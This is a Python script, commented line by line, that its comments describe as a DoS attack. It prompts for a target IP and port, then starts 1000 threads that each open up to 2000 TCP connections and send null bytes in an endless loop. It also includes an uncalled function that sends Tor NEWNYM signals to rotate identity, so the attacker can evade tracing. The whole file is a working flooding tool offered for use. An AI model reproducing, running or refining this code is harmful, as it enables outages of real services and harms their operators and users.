import socket  # Import socket module for network communication
import threading  # Import threading module to run multiple threads
import time  # Import time module for delays

# Function to create and connect a socket to the target
def make_socket(host, port):
    # Create a socket using IPv4 and TCP protocol
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Attempt to connect the socket to the target host and port
        sock.connect((host, port))
        print(f"[Connected -> {host}:{port}]")
        return sock  # Return the socket if connected successfully
    except Exception as e:
        # If connection fails, print the error and close the socket
        print(f"Connection failed: {e}")
        sock.close()  # Release resources of the failed socket
        return None  # Return None to indicate failure

# Function to perform the DoS attack
def attack(host, port, id):
    # Create a list to hold sockets for the attack
    sockets = [0] * CONNECTIONS
    while True:  # Infinite loop to keep the attack running
        for x in range(CONNECTIONS):
            # If socket is not initialized, create a new socket
            if sockets[x] == 0:
                sockets[x] = make_socket(host, port)
            try:
                # If the socket exists, send a zero-byte message
                if sockets[x]:
                    sockets[x].send(b"\0")
                    print(f"[{id}: Voly Sent]")  # Log the sent message
            except Exception as e:
                # If sending fails, create a new socket
                print(f"Socket error: {e}")
                sockets[x] = make_socket(host, port)
        time.sleep(0.3)  # Delay between iterations to avoid overwhelming system resources

# Function to cycle the IP address using Tor (if applicable)
def cycle_identity():
    try:
        # Create a connection to the Tor proxy control port
        sock = make_socket("localhost", 9050)
        if sock:
            # Authenticate with the Tor proxy
            sock.send(b'AUTHENTICATE ""\n')
            while True:  # Infinite loop to keep sending new identity signals
                # Send a signal to change the Tor circuit
                sock.send(b'signal NEWNYM\n\x00')
                print("[cycle_identity -> signal NEWNYM]")  # Log the signal
                time.sleep(0.3)  # Delay to avoid overwhelming the proxy
    except Exception as e:
        # If identity cycling fails, print the error
        print(f"Identity cycling failed: {e}")

# Main code block
if __name__ == "__main__":
    CONNECTIONS = 2000  # Number of connections each thread will manage
    THREADS = 1000  # Number of threads to run simultaneously
    # Get the target IP and port from the user
    host = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    
    # Create and start threads to perform the attack
    for x in range(THREADS):
        threading.Thread(target=attack, args=(host, port, x)).start()
        time.sleep(0.2)  # Small delay to avoid overloading the system
    
    input()  # Keeps the program running until user manually stops it
